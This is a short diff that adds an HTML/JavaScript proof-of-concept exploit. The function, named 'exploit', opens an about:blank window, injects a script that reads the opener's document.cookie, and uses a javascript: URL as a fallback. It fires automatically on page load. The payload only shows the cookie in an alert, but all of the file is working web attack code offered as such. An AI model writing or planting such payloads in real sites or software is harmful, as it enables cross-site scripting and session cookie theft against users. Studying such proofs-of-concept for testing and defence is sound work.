@@ -1,0 +1,19 @@
+<script>
+    function exploit() {
+        // Open a new window to about:blank, which inherits the parent's origin temporarily
+        var w = window.open('about:blank');
+        
+        // Immediately inject malicious script into the new window's document
+        try {
+            w.document.write('<script>alert("XSS in parent origin: " + window.opener.document.cookie);<\/script>');
+        } catch (e) {
+            // Fallback method if write is blocked
+            setTimeout(() => {
+                w.location = 'javascript:alert("Fallback XSS: " + document.cookie)';
+            }, 100);
+        }
+    }
+    
+    // Trigger the exploit attempt
+    setTimeout(exploit, 0);
+</script>
